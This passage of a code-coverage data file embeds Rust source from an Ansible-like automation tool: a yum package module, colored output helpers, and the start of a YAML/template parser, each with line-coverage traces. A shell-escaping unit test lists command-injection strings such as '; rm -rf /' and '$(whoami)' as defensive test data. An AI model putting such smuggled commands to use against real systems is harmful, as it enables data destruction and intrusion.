Vec::new();\n                let mut already_ok: Vec\u003cString\u003e = Vec::new();\n\n                // Check current state of packages\n                for package in \u0026packages {\n                    let is_installed = Self::is_package_installed_remote(\n                        conn.as_ref(),\n                        package,\n                        Some(exec_options.clone()),\n                    )\n                    .await?;\n\n                    match state {\n                        YumState::Present =\u003e {\n                            if is_installed {\n                                already_ok.push(package.clone());\n                            } else {\n                                to_install.push(package.clone());\n                            }\n                        }\n                        YumState::Absent =\u003e {\n                            if is_installed {\n                                to_remove.push(package.clone());\n                            } else {\n                                already_ok.push(package.clone());\n                            }\n                        }\n                        YumState::Latest =\u003e {\n                            // For 'latest', we always try to install/upgrade\n                            to_install.push(package.clone());\n                        }\n                    }\n                }\n\n                // Check mode - return what would happen\n                if context.check_mode {\n                    if to_install.is_empty() \u0026\u0026 to_remove.is_empty() {\n                        return Ok(ModuleOutput::ok(format!(\n                            \"All packages already in desired state: {}\",\n                            already_ok.join(\", \")\n                        )));\n                    }\n\n                    let mut msg = String::new();\n                    if !to_install.is_empty() {\n                        msg.push_str(\u0026format!(\"Would install: {}. \", to_install.join(\", \")));\n                    }\n                    if !to_remove.is_empty() {\n                        msg.push_str(\u0026format!(\"Would remove: {}. \", to_remove.join(\", \")));\n                    }\n\n                    return Ok(ModuleOutput::changed(msg.trim().to_string()));\n                }\n\n                // Perform the actual operations\n                let mut changed = false;\n                let mut results: HashMap\u003cString, String\u003e = HashMap::new();\n\n                if !to_install.is_empty() {\n                    let mut install_args = vec![\"install\", \"-y\"];\n\n                    if disable_gpg_check {\n                        install_args.push(\"--nogpgcheck\");\n                    }\n\n                    if let Some(ref repo) = enablerepo {\n                        install_args.push(\"--enablerepo\");\n                        install_args.push(repo);\n                    }\n\n                    if let Some(ref repo) = disablerepo {\n                        install_args.push(\"--disablerepo\");\n                        install_args.push(repo);\n                    }\n\n                    let (success, stdout, stderr) = Self::run_yum_command_remote(\n                        conn.as_ref(),\n                        \u0026install_args,\n                        \u0026to_install,\n                        Some(exec_options.clone()),\n                    )\n                    .await?;\n\n                    if !success {\n                        return Err(ModuleError::ExecutionFailed(format!(\n                            \"Failed to install packages: {}\",\n                            if stderr.is_empty() { stdout } else { stderr }\n                        )));\n                    }\n\n                    changed = true;\n                    for pkg in \u0026to_install {\n                        results.insert(pkg.clone(), \"installed\".to_string());\n                    }\n                }\n\n                if !to_remove.is_empty() {\n                    let remove_args = vec![\"remove\", \"-y\"];\n                    let (success, stdout, stderr) = Self::run_yum_command_remote(\n                        conn.as_ref(),\n                        \u0026remove_args,\n                        \u0026to_remove,\n                        Some(exec_options.clone()),\n                    )\n                    .await?;\n\n                    if !success {\n                        return Err(ModuleError::ExecutionFailed(format!(\n                            \"Failed to remove packages: {}\",\n                            if stderr.is_empty() { stdout } else { stderr }\n                        )));\n                    }\n\n                    changed = true;\n                    for pkg in \u0026to_remove {\n                        results.insert(pkg.clone(), \"removed\".to_string());\n                    }\n                }\n\n                for pkg in \u0026already_ok {\n                    results.insert(pkg.clone(), \"ok\".to_string());\n                }\n\n                if changed {\n                    let mut msg = String::new();\n                    if !to_install.is_empty() {\n                        msg.push_str(\u0026format!(\"Installed: {}. \", to_install.join(\", \")));\n                    }\n                    if !to_remove.is_empty() {\n                        msg.push_str(\u0026format!(\"Removed: {}. \", to_remove.join(\", \")));\n                    }\n\n                    Ok(ModuleOutput::changed(msg.trim().to_string())\n                        .with_data(\"results\", serde_json::json!(results)))\n                } else {\n                    Ok(\n                        ModuleOutput::ok(\"All packages already in desired state\".to_string())\n                            .with_data(\"results\", serde_json::json!(results)),\n                    )\n                }\n            })\n        });\n\n        result\n    }\n\n    fn check(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let check_context = ModuleContext {\n            check_mode: true,\n            ..context.clone()\n        };\n        self.execute(params, \u0026check_context)\n    }\n\n    fn diff(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cOption\u003cDiff\u003e\u003e {\n        let packages: Vec\u003cString\u003e = if let Some(names) = params.get_vec_string(\"name\")? {\n            names\n        } else {\n            vec![params.get_string_required(\"name\")?]\n        };\n\n        let state_str = params\n            .get_string(\"state\")?\n            .unwrap_or_else(|| \"present\".to_string());\n        let state = YumState::from_str(\u0026state_str)?;\n\n        // Get connection from context\n        let conn = match context.connection.as_ref() {\n            Some(c) =\u003e c,\n            None =\u003e {\n                // No connection available, return basic diff without checking remote state\n                let mut before_lines = Vec::new();\n                let mut after_lines = Vec::new();\n\n                for package in \u0026packages {\n                    match state {\n                        YumState::Present | YumState::Latest =\u003e {\n                            before_lines.push(format!(\"{}: (unknown)\", package));\n                            after_lines.push(format!(\"{}: (will be installed/updated)\", package));\n                        }\n                        YumState::Absent =\u003e {\n                            before_lines.push(format!(\"{}: (unknown)\", package));\n                            after_lines.push(format!(\"{}: (will be removed)\", package));\n                        }\n                    }\n                }\n\n                return Ok(Some(Diff::new(\n                    before_lines.join(\"\\n\"),\n                    after_lines.join(\"\\n\"),\n                )));\n            }\n        };\n\n        let exec_options = Self::build_exec_options(context);\n\n        let result = tokio::task::block_in_place(|| {\n            tokio::runtime::Handle::current().block_on(async {\n                let mut before_lines = Vec::new();\n                let mut after_lines = Vec::new();\n\n                for package in \u0026packages {\n                    let is_installed = Self::is_package_installed_remote(\n                        conn.as_ref(),\n                        package,\n                        Some(exec_options.clone()),\n                    )\n                    .await?;\n\n                    let version = Self::get_installed_version_remote(\n                        conn.as_ref(),\n                        package,\n                        Some(exec_options.clone()),\n                    )\n                    .await?\n                    .unwrap_or_default();\n\n                    match state {\n                        YumState::Present | YumState::Latest =\u003e {\n                            if is_installed {\n                                before_lines.push(format!(\"{}: {}\", package, version));\n                                after_lines.push(format!(\"{}: {}\", package, version));\n                            } else {\n                                before_lines.push(format!(\"{}: (not installed)\", package));\n                                after_lines.push(format!(\"{}: (will be installed)\", package));\n                            }\n                        }\n                        YumState::Absent =\u003e {\n                            if is_installed {\n                                before_lines.push(format!(\"{}: {}\", package, version));\n                                after_lines.push(format!(\"{}: (will be removed)\", package));\n                            } else {\n                                before_lines.push(format!(\"{}: (not installed)\", package));\n                                after_lines.push(format!(\"{}: (not installed)\", package));\n                            }\n                        }\n                    }\n                }\n\n                Ok(Some(Diff::new(\n                    before_lines.join(\"\\n\"),\n                    after_lines.join(\"\\n\"),\n                )))\n            })\n        });\n\n        result\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_shell_escape() {\n        assert_eq!(shell_escape(\"simple\"), \"simple\");\n        assert_eq!(shell_escape(\"nginx-1.0\"), \"nginx-1.0\");\n        assert_eq!(shell_escape(\"with space\"), \"'with space'\");\n        assert_eq!(shell_escape(\"with'quote\"), \"'with'\\\\''quote'\");\n        assert_eq!(shell_escape(\"; rm -rf /\"), \"'; rm -rf /'\");\n        assert_eq!(shell_escape(\"$(whoami)\"), \"'$(whoami)'\");\n        assert_eq!(shell_escape(\"`id`\"), \"'`id`'\");\n    }\n\n    #[test]\n    fn test_yum_state_from_str() {\n        assert_eq!(YumState::from_str(\"present\").unwrap(), YumState::Present);\n        assert_eq!(YumState::from_str(\"installed\").unwrap(), YumState::Present);\n        assert_eq!(YumState::from_str(\"absent\").unwrap(), YumState::Absent);\n        assert_eq!(YumState::from_str(\"removed\").unwrap(), YumState::Absent);\n        assert_eq!(YumState::from_str(\"latest\").unwrap(), YumState::Latest);\n        assert!(YumState::from_str(\"invalid\").is_err());\n    }\n\n    #[test]\n    fn test_yum_module_name() {\n        let module = YumModule;\n        assert_eq!(module.name(), \"yum\");\n    }\n\n    #[test]\n    fn test_yum_module_classification() {\n        let module = YumModule;\n        assert_eq!(module.classification(), ModuleClassification::RemoteCommand);\n    }\n\n    #[test]\n    fn test_yum_module_parallelization() {\n        let module = YumModule;\n        assert_eq!(\n            module.parallelization_hint(),\n            ParallelizationHint::HostExclusive\n        );\n    }\n\n    #[test]\n    fn test_yum_required_params() {\n        let module = YumModule;\n        assert_eq!(module.required_params(), \u0026[\"name\"]);\n    }\n}\n","traces":[{"line":14,"address":[30173712,30174059,30174065],"length":1,"stats":{"Line":1}},{"line":16,"address":[30173796,30173771],"length":1,"stats":{"Line":2}},{"line":17,"address":[30173786],"length":1,"stats":{"Line":3}},{"line":19,"address":[30173897],"length":1,"stats":{"Line":1}},{"line":21,"address":[30173810,30173908],"length":1,"stats":{"Line":1}},{"line":34,"address":[30174773,30174080,30174779],"length":1,"stats":{"Line":1}},{"line":35,"address":[30174209,30174107],"length":1,"stats":{"Line":2}},{"line":36,"address":[30174225],"length":1,"stats":{"Line":1}},{"line":37,"address":[30174338],"length":1,"stats":{"Line":1}},{"line":38,"address":[30174521,30174451],"length":1,"stats":{"Line":2}},{"line":39,"address":[30174489,30174543],"length":1,"stats":{"Line":2}},{"line":52,"address":[30175968],"length":1,"stats":{"Line":0}},{"line":57,"address":[30567636,30567739],"length":1,"stats":{"Line":0}},{"line":58,"address":[25983261],"length":1,"stats":{"Line":0}},{"line":59,"address":[30568622],"length":1,"stats":{"Line":0}},{"line":60,"address":[30568591],"length":1,"stats":{"Line":0}},{"line":65,"address":[30176080],"length":1,"stats":{"Line":0}},{"line":70,"address":[30569436],"length":1,"stats":{"Line":0}},{"line":72,"address":[30569330],"length":1,"stats":{"Line":0}},{"line":74,"address":[25987341],"length":1,"stats":{"Line":0}},{"line":75,"address":[30570436],"length":1,"stats":{"Line":0}},{"line":76,"address":[30570542,30570617],"length":1,"stats":{"Line":0}},{"line":77,"address":[30570679,30570738,30570918],"length":1,"stats":{"Line":0}},{"line":78,"address":[30570920],"length":1,"stats":{"Line":0}},{"line":80,"address":[30570748],"length":1,"stats":{"Line":0}},{"line":83,"address":[30570347],"length":1,"stats":{"Line":0}},{"line":88,"address":[30175824],"length":1,"stats":{"Line":0}},{"line":94,"address":[30566096,30565096,30565210],"length":1,"stats":{"Line":0}},{"line":95,"address":[30565585,30565477,30567331,30567296],"length":1,"stats":{"Line":0}},{"line":96,"address":[30567395,30567360,30565657],"length":1,"stats":{"Line":0}},{"line":98,"address":[30565746],"length":1,"stats":{"Line":0}},{"line":100,"address":[30566298,30566415,30565987,30566491,30566050],"length":1,"stats":{"Line":0}},{"line":101,"address":[30565831,30565914,30565991],"length":1,"stats":{"Line":0}},{"line":102,"address":[25972157],"length":1,"stats":{"Line":0}},{"line":103,"address":[30567040,30567062,30566459,30566392],"length":1,"stats":{"Line":0}},{"line":105,"address":[30566596],"length":1,"stats":{"Line":0}},{"line":109,"address":[30175728],"length":1,"stats":{"Line":0}},{"line":113,"address":[30563315],"length":1,"stats":{"Line":0}},{"line":114,"address":[30563461,30563830,30563947,30563614,30564544,30564023],"length":1,"stats":{"Line":0}},{"line":115,"address":[30563465],"length":1,"stats":{"Line":0}},{"line":116,"address":[30563894,30563582,30563518,30563633,30563682],"length":1,"stats":{"Line":0}},{"line":117,"address":[30563924,30564582,30563991,30564560],"length":1,"stats":{"Line":0}},{"line":119,"address":[30564108,30564171],"length":1,"stats":{"Line":0}},{"line":120,"address":[30564153],"length":1,"stats":{"Line":0}},{"line":122,"address":[30564216,30564118],"length":1,"stats":{"Line":0}},{"line":130,"address":[30175688,30174800,30175595],"length":1,"stats":{"Line":0}},{"line":131,"address":[30174830],"length":1,"stats":{"Line":0}},{"line":133,"address":[30174893,30175337],"length":1,"stats":{"Line":0}},{"line":134,"address":[30174953],"length":1,"stats":{"Line":0}},{"line":135,"address":[30174961,30175064,30175143,30175048],"length":1,"stats":{"Line":0}},{"line":137,"address":[30174965],"length":1,"stats":{"Line":0}},{"line":138,"address":[30175041,30175111],"length":1,"stats":{"Line":0}},{"line":139,"address":[30175216,30175177],"length":1,"stats":{"Line":0}},{"line":142,"address":[30175347,30175562,30174907],"length":1,"stats":{"Line":0}},{"line":143,"address":[30175355,30175515],"length":1,"stats":{"Line":0}},{"line":146,"address":[30175439],"length":1,"stats":{"Line":0}},{"line":151,"address":[30170624],"length":1,"stats":{"Line":1}},{"line":155,"address":[30167232],"length":1,"stats":{"Line":0}},{"line":159,"address":[30167264],"length":1,"stats":{"Line":1}},{"line":163,"address":[30167312],"length":1,"stats":{"Line":1}},{"line":168,"address":[30167280],"length":1,"stats":{"Line":1}},{"line":172,"address":[30173536,30171088,30173620],"length":1,"stats":{"Line":0}},{"line":178,"address":[30171147,30171475],"length":1,"stats":{"Line":0}},{"line":179,"address":[30171436],"length":1,"stats":{"Line":0}},{"line":181,"address":[30171487,30171567,30173633],"length":1,"stats":{"Line":0}},{"line":184,"address":[30173618,30171988,30172069],"length":1,"stats":{"Line":0}},{"line":186,"address":[30172126],"length":1,"stats":{"Line":0}},{"line":187,"address":[30173603,30172243,30172164],"length":1,"stats":{"Line":0}},{"line":189,"address":[30172398],"length":1,"stats":{"Line":0}},{"line":190,"address":[30172441],"length":1,"stats":{"Line":0}},{"line":191,"address":[30172484,30173601],"length":1,"stats":{"Line":0}},{"line":192,"address":[30173580,30172702,30172789],"length":1,"stats":{"Line":0}},{"line":195,"address":[30173040,30173144,30172964],"length":1,"stats":{"Line":0}},{"line":196,"address":[30550815],"length":1,"stats":{"Line":0}},{"line":198,"address":[30550782],"length":1,"stats":{"Line":0}},{"line":203,"address":[30173202],"length":1,"stats":{"Line":0}},{"line":206,"address":[30173226],"length":1,"stats":{"Line":0}},{"line":207,"address":[30551076,30550941,30551140,30550535,30551161,30551272,30552270,30551119,30551536,30550864],"length":1,"stats":{"Line":0}},{"line":209,"address":[30550990,30551216,30551908],"length":1,"stats":{"Line":0}},{"line":210,"address":[30551237,30552211,30551570,30551106,30551354],"length":1,"stats":{"Line":0}},{"line":214,"address":[30551190],"length":1,"stats":{"Line":0}},{"line":215,"address":[30551921],"length":1,"stats":{"Line":0}},{"line":216,"address":[30551992],"length":1,"stats":{"Line":0}},{"line":219,"address":[30552060,30552160,30552182,30553170],"length":1,"stats":{"Line":0}},{"line":220,"address":[30552481,30556408,30556476,30552543,30556446,30552619],"length":1,"stats":{"Line":0}},{"line":221,"address":[30553232],"length":1,"stats":{"Line":0}},{"line":222,"address":[30556233],"length":1,"stats":{"Line":0}},{"line":223,"address":[30556303],"length":1,"stats":{"Line":0}},{"line":225,"address":[30552513,30551127,30552587,30556471,30552314,30552284,30556431],"length":1,"stats":{"Line":0}},{"line":227,"address":[30552681],"length":1,"stats":{"Line":0}},{"line":229,"address":[30552728],"length":1,"stats":{"Line":0}},{"line":230,"address":[30552944,30552863],"length":1,"stats":{"Line":0}},{"line":232,"address":[30552814,30552912],"length":1,"stats":{"Line":0}},{"line":236,"address":[30552741],"length":1,"stats":{"Line":0}},{"line":237,"address":[30553025,30553106],"length":1,"stats":{"Line":0}},{"line":239,"address":[30552976,30553074],"length":1,"stats":{"Line":0}},{"line":244,"address":[30552762,30553138],"length":1,"stats":{"Line":0}},{"line":250,"address":[30553270],"length":1,"stats":{"Line":0}},{"line":251,"address":[30554622,30553325,30554651],"length":1,"stats":{"Line":0}},{"line":252,"address":[30555949],"length":1,"stats":{"Line":0}},{"line":254,"address":[30554694,30555909],"length":1,"stats":{"Line":0}},{"line":258,"address":[30554636],"length":1,"stats":{"Line":0}},{"line":259,"address":[30554809,30554736],"length":1,"stats":{"Line":0}},{"line":260,"address":[30554823,30554903],"length":1,"stats":{"Line":0}},{"line":262,"address":[30555268,30554862],"length":1,"stats":{"Line":0}},{"line":263,"address":[30555363,30555282],"length":1,"stats":{"Line":0}},{"line":266,"address":[30555737,30555321],"length":1,"stats":{"Line":0}},{"line":270,"address":[30553291],"length":1,"stats":{"Line":0}},{"line":271,"address":[30553299],"length":1,"stats":{"Line":0}},{"line":273,"address":[30553358,30553438],"length":1,"stats":{"Line":0}},{"line":274,"address":[30553510,30553454],"length":1,"stats":{"Line":0}},{"line":276,"address":[30553668],"length":1,"stats":{"Line":0}},{"line":277,"address":[30553734,30553815],"length":1,"stats":{"Line":0}},{"line":280,"address":[30553828,30553685],"length":1,"stats":{"Line":0}},{"line":281,"address":[30553848],"length":1,"stats":{"Line":0}},{"line":282,"address":[30553943],"length":1,"stats":{"Line":0}},{"line":285,"address":[30553886,30554028],"length":1,"stats":{"Line":0}},{"line":286,"address":[30554048],"length":1,"stats":{"Line":0}},{"line":287,"address":[30554129],"length":1,"stats":{"Line":0}},{"line":290,"address":[30556826,30556750,30554501,30556656,30554557,30559044],"length":1,"stats":{"Line":0}},{"line":291,"address":[30554086],"length":1,"stats":{"Line":0}},{"line":292,"address":[30554243],"length":1,"stats":{"Line":0}},{"line":293,"address":[30554317],"length":1,"stats":{"Line":0}},{"line":294,"address":[30554388],"length":1,"stats":{"Line":0}},{"line":296,"address":[30554542,30554590,30551148,30556489,30556794,30556720],"length":1,"stats":{"Line":0}},{"line":298,"address":[30557016],"length":1,"stats":{"Line":0}},{"line":299,"address":[30557268],"length":1,"stats":{"Line":0}},{"line":301,"address":[30557140,30557028],"length":1,"stats":{"Line":0}},{"line":305,"address":[30557050],"length":1,"stats":{"Line":0}},{"line":306,"address":[30557810,30557058],"length":1,"stats":{"Line":0}},{"line":307,"address":[30557924,30558779,30558853],"length":1,"stats":{"Line":0}},{"line":311,"address":[30553477,30558050],"length":1,"stats":{"Line":0}},{"line":312,"address":[30558066,30558131],"length":1,"stats":{"Line":0}},{"line":313,"address":[30559423,30558721,30558665,30563023,30559347,30559253],"length":1,"stats":{"Line":0}},{"line":314,"address":[30558289],"length":1,"stats":{"Line":0}},{"line":315,"address":[30558407],"length":1,"stats":{"Line":0}},{"line":316,"address":[30558481],"length":1,"stats":{"Line":0}},{"line":317,"address":[30558552],"length":1,"stats":{"Line":0}},{"line":319,"address":[26108816],"length":1,"stats":{"Line":0}},{"line":321,"address":[30559613],"length":1,"stats":{"Line":0}},{"line":322,"address":[30559865],"length":1,"stats":{"Line":0}},{"line":324,"address":[30559625,30559737],"length":1,"stats":{"Line":0}},{"line":328,"address":[30559647],"length":1,"stats":{"Line":0}},{"line":329,"address":[30560407,30559655],"length":1,"stats":{"Line":0}},{"line":330,"address":[30562832,30560521,30562758],"length":1,"stats":{"Line":0}},{"line":334,"address":[30558089,30560656],"length":1,"stats":{"Line":0}},{"line":335,"address":[30562611,30562537,30560770],"length":1,"stats":{"Line":0}},{"line":338,"address":[30560806],"length":1,"stats":{"Line":0}},{"line":339,"address":[30560855],"length":1,"stats":{"Line":0}},{"line":340,"address":[30561240,30561173],"length":1,"stats":{"Line":0}},{"line":341,"address":[30561254,30561319],"length":1,"stats":{"Line":0}},{"line":343,"address":[30561287,30561669],"length":1,"stats":{"Line":0}},{"line":344,"address":[30561683,30561746],"length":1,"stats":{"Line":0}},{"line":347,"address":[30562336,30561716,30562154,30562423],"length":1,"stats":{"Line":0}},{"line":348,"address":[30562344,30562527,30562261,30562239,30562092],"length":1,"stats":{"Line":0}},{"line":350,"address":[30561092],"length":1,"stats":{"Line":0}},{"line":351,"address":[30560816,30560916,30561033],"length":1,"stats":{"Line":0}},{"line":352,"address":[30561155,30560939,30560865,30560961,30561041],"length":1,"stats":{"Line":0}},{"line":358,"address":[30173438],"length":1,"stats":{"Line":0}},{"line":361,"address":[30171056,30171062,30170656],"length":1,"stats":{"Line":0}},{"line":366,"address":[30170992],"length":1,"stats":{"Line":0}},{"line":369,"address":[30170536,30167328,30169582],"length":1,"stats":{"Line":0}},{"line":370,"address":[30167393,30167762],"length":1,"stats":{"Line":0}},{"line":371,"address":[30167714],"length":1,"stats":{"Line":0}},{"line":373,"address":[30167854,30167774,30170549],"length":1,"stats":{"Line":0}},{"line":376,"address":[30168284,30168368,30170534],"length":1,"stats":{"Line":0}},{"line":378,"address":[30545584,30545596],"length":1,"stats":{"Line":0}},{"line":379,"address":[30168542,30170513,30168463],"length":1,"stats":{"Line":0}},{"line":382,"address":[30168700],"length":1,"stats":{"Line":0}},{"line":383,"address":[30168768],"length":1,"stats":{"Line":0}},{"line":386,"address":[30168807],"length":1,"stats":{"Line":0}},{"line":387,"address":[30168826],"length":1,"stats":{"Line":0}},{"line":389,"address":[30168889,30168969],"length":1,"stats":{"Line":0}},{"line":390,"address":[30169069],"length":1,"stats":{"Line":0}},{"line":392,"address":[30169957,30169598],"length":1,"stats":{"Line":0}},{"line":393,"address":[30170092],"length":1,"stats":{"Line":0}},{"line":396,"address":[30169636],"length":1,"stats":{"Line":0}},{"line":397,"address":[30169798],"length":1,"stats":{"Line":0}},{"line":402,"address":[30169361,30169306],"length":1,"stats":{"Line":0}},{"line":403,"address":[30169115],"length":1,"stats":{"Line":0}},{"line":404,"address":[30169194,30169274],"length":1,"stats":{"Line":0}},{"line":409,"address":[30168797],"length":1,"stats":{"Line":0}},{"line":411,"address":[30545820,30545632],"length":1,"stats":{"Line":0}},{"line":412,"address":[30545956,30545887,30545653,30546028,30545840,30545999,30549444,30546284],"length":1,"stats":{"Line":0}},{"line":413,"address":[30545933],"length":1,"stats":{"Line":0}},{"line":414,"address":[30546075],"length":1,"stats":{"Line":0}},{"line":416,"address":[30546258,30546143,30546242,30548568],"length":1,"stats":{"Line":0}},{"line":417,"address":[30549963,30550404,30549767,30550022,30549729,30550098],"length":1,"stats":{"Line":0}},{"line":418,"address":[30548627],"length":1,"stats":{"Line":0}},{"line":419,"address":[30549593],"length":1,"stats":{"Line":0}},{"line":420,"address":[30549642],"length":1,"stats":{"Line":0}},{"line":422,"address":[30550066,30545986,30549789,30546318,30549752,30549995,30549802],"length":1,"stats":{"Line":0}},{"line":424,"address":[30546671,30550339,30546595,30546536,30550429,30550377],"length":1,"stats":{"Line":0}},{"line":425,"address":[30550156],"length":1,"stats":{"Line":0}},{"line":426,"address":[30550205],"length":1,"stats":{"Line":0}},{"line":427,"address":[30550254],"length":1,"stats":{"Line":0}},{"line":429,"address":[26102766],"length":1,"stats":{"Line":0}},{"line":430,"address":[26102863,26102835],"length":1,"stats":{"Line":0}},{"line":432,"address":[30546771],"length":1,"stats":{"Line":0}},{"line":434,"address":[30546817],"length":1,"stats":{"Line":0}},{"line":435,"address":[30548145,30547767],"length":1,"stats":{"Line":0}},{"line":436,"address":[30548323],"length":1,"stats":{"Line":0}},{"line":438,"address":[30547832,30547713],"length":1,"stats":{"Line":0}},{"line":439,"address":[30547967],"length":1,"stats":{"Line":0}},{"line":443,"address":[30546840],"length":1,"stats":{"Line":0}},{"line":444,"address":[30546908,30547349],"length":1,"stats":{"Line":0}},{"line":445,"address":[30547527],"length":1,"stats":{"Line":0}},{"line":447,"address":[30547017,30546854],"length":1,"stats":{"Line":0}},{"line":448,"address":[30547152],"length":1,"stats":{"Line":0}},{"line":454,"address":[30549036,30549091],"length":1,"stats":{"Line":0}},{"line":455,"address":[30548665,30548768,30548864],"length":1,"stats":{"Line":0}},{"line":456,"address":[30548872,30548963],"length":1,"stats":{"Line":0}},{"line":461,"address":[30170390],"length":1,"stats":{"Line":0}}],"covered":15,"coverable":213},{"path":["/","home","artur","Repositories","rustible","src","output.rs"],"content":"//! Output and reporting for Rustible\n\nuse colored::Colorize;\n\n/// Print a play header\npub fn play_header(name: \u0026str) {\n    let header = format!(\"PLAY [{}]\", name);\n    let stars = \"*\".repeat(80_usize.saturating_sub(header.len()));\n    println!(\n        \"\\n{} {}\",\n        header.bright_white().bold(),\n        stars.bright_black()\n    );\n}\n\n/// Print a task header\npub fn task_header(name: \u0026str) {\n    let header = format!(\"TASK [{}]\", name);\n    let stars = \"*\".repeat(80_usize.saturating_sub(header.len()));\n    println!(\n        \"\\n{} {}\",\n        header.bright_white().bold(),\n        stars.bright_black()\n    );\n}\n\n/// Print an ok result\npub fn ok(host: \u0026str) {\n    println!(\"{}: [{}]\", \"ok\".green(), host.bright_white().bold());\n}\n\n/// Print a changed result\npub fn changed(host: \u0026str) {\n    println!(\"{}: [{}]\", \"changed\".yellow(), host.bright_white().bold());\n}\n\n/// Print a failed result\npub fn failed(host: \u0026str, msg: \u0026str) {\n    println!(\n        \"{}: [{}] =\u003e {}\",\n        \"failed\".red().bold(),\n        host.bright_white().bold(),\n        msg\n    );\n}\n\n/// Print a skipped result\npub fn skipped(host: \u0026str) {\n    println!(\"{}: [{}]\", \"skipping\".cyan(), host.bright_white().bold());\n}\n\n/// Print recap\npub fn recap(hosts: \u0026[(String, u32, u32, u32, u32)]) {\n    println!(\n        \"\\n{} {}\",\n        \"PLAY RECAP\".bright_white().bold(),\n        \"*\".repeat(70).bright_black()\n    );\n\n    for (host, ok, changed, failed, skipped) in hosts {\n        let host_colored = if *failed \u003e 0 {\n            host.red().bold()\n        } else if *changed \u003e 0 {\n            host.yellow()\n        } else {\n            host.green()\n        };\n\n        println!(\n            \"{:\u003c30} : {}={:\u003c4} {}={:\u003c4} {}={:\u003c4} {}={:\u003c4}\",\n            host_colored,\n            \"ok\".green(),\n            ok,\n            \"changed\".yellow(),\n            changed,\n            \"failed\".red(),\n            failed,\n            \"skipped\".cyan(),\n            skipped,\n        );\n    }\n}\n","traces":[{"line":6,"address":[30513511,30513517,30512752],"length":1,"stats":{"Line":0}},{"line":7,"address":[30512774],"length":1,"stats":{"Line":0}},{"line":8,"address":[30512901,30512964],"length":1,"stats":{"Line":0}},{"line":9,"address":[30513155,30513236],"length":1,"stats":{"Line":0}},{"line":17,"address":[30514295,30513536,30514301],"length":1,"stats":{"Line":0}},{"line":18,"address":[30513558],"length":1,"stats":{"Line":0}},{"line":19,"address":[30513685,30513748],"length":1,"stats":{"Line":0}},{"line":20,"address":[30513939,30514020],"length":1,"stats":{"Line":0}},{"line":28,"address":[30514700,30514694,30514320],"length":1,"stats":{"Line":0}},{"line":29,"address":[30514353],"length":1,"stats":{"Line":0}},{"line":33,"address":[30517104,30517478,30517484],"length":1,"stats":{"Line":0}},{"line":34,"address":[30517137],"length":1,"stats":{"Line":1}},{"line":38,"address":[30516608,30517081,30517087],"length":1,"stats":{"Line":0}},{"line":39,"address":[30516804,30516731],"length":1,"stats":{"Line":0}},{"line":48,"address":[30517884,30517504,30517878],"length":1,"stats":{"Line":0}},{"line":49,"address":[30517537],"length":1,"stats":{"Line":0}},{"line":53,"address":[48515367],"length":1,"stats":{"Line":0}},{"line":54,"address":[30514838,30514904,30514979],"length":1,"stats":{"Line":0}},{"line":60,"address":[30515231,30515252],"length":1,"stats":{"Line":0}},{"line":61,"address":[30515405],"length":1,"stats":{"Line":0}},{"line":62,"address":[30515448],"length":1,"stats":{"Line":0}},{"line":63,"address":[30515428],"length":1,"stats":{"Line":0}},{"line":64,"address":[30515528],"length":1,"stats":{"Line":0}},{"line":66,"address":[30515499],"length":1,"stats":{"Line":0}},{"line":69,"address":[30515625],"length":1,"stats":{"Line":0}}],"covered":1,"coverable":25},{"path":["/","home","artur","Repositories","rustible","src","parser","mod.rs"],"content":"//! YAML parsing and templating for Rustible.\n//!\n//! This module provides:\n//! - Playbook YAML parsing\n//! - Variable file parsing\n//! - Jinja2-style templating using minijinja\n\npub mod playbook;\n\npub use playbook::{\n    Handler, IncludeType, LoopControl, LoopSpec, ModuleCall, Play, PlayOrder, Playbook,\n    RoleInclusion, RoleSpec, SerialSpec, Task, TaskBuilder, VarsPrompt,\n};\n\nuse indexmap::IndexMap;\nuse minijinja::{Environment, Value};\nuse std::path::Path;\nuse thiserror::Error;\n\n/// Errors that can occur during parsing\n#[derive(Debug, Error)]\npub enum ParseError {\n    #[error(\"IO error: {0}\")]\n    Io(#[from] std::io::Error),\n\n    #[error(\"YAML parsing error: {0}\")]\n    Yaml(#[from] serde_yaml::Error),\n\n    #[error(\"JSON parsing error: {0}\")]\n    Json(#[from] serde_json::Error),\n\n    #[error(\"template error: {0}\")]\n    Template(#[from] minijinja::Error),\n\n    #[error(\"invalid playbook structure: {0}\")]\n    InvalidStructure(String),\n\n    #[error(\"missing required field: {0}\")]\n    MissingField(String),\n\n    #[error(\"include error: {0}\")]\n    IncludeError(String),\n}\n\n/// Result type for parsing operations\npub type ParseResult\u003cT\u003e = Result\u003cT, ParseError\u003e;\n\n/// The main parser for Rustible\n#[derive(Debug)]\npub struct Parser {\n    /// Jinja2-style template environment\n    template_env: Environment\u003c'static\u003e,\n\n    /// Base directory for relative includes\n    base_dir: Option\u003cstd::path::PathBuf\u003e,\n\n    /// Strict mode (fail on undefined variables)\n    strict: bool,\n}\n\nimpl Default for Parser {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\nimpl Parser {\n    /// Create a new parser\n    pub fn new() -\u003e Self {\n        let mut template_env = Environment::new();\n\n        // Configure for Ansible compatibility\n        template_env.set_trim_blocks(true);\n        template_env.set_lstrip_blocks(true);\n\n        // Add built-in filters\n        Self::add_builtin_filters(\u0026mut template_env);\n\n        // Add built-in functions\n        Self::add_builtin_functions(\u0026mut template_env);\n\n        Self {\n            template_env,\n            base_dir: None,\n            strict: false,\n        }\n    }\n\n    /// Create a parser with a base directory\n    pub fn with_base_dir\u003cP: AsRef\u003cPath\u003e\u003e(mut self, base_dir: P) -\u003e Self {\n        self.base_dir = Some(base_dir.as_ref().to_path_buf());\n        self\n    }\n\n    /// Enable strict mode\n    pub fn strict(mut self, strict: bool) -\u003e Self {\n        self.strict = strict;\n        self\n    }\n\n    /// Add Ansible-compatible built-in filters\n    fn add_builtin_filters(env: \u0026mut Environment\u003c'static\u003e) {\n        // String filters\n        env.add_filter(\"lower\", |s: String| s.to_lowercase());\n        env.add_filter(\"upper\", |s: String| s.to_uppercase());\n        env.add_filter(\"capitalize\", |s: String| {\n            let mut chars = s.chars();\n            match chars.next() {\n                None =\u003e String::new(),\n                Some(c) =\u003e c.to_uppercase().chain(chars).collect(),\n            }\n        });\n        env.add_filter(\"title\", |s: String| {\n            s.split_whitespace()\n                .map(|word| {\n                    let mut chars = 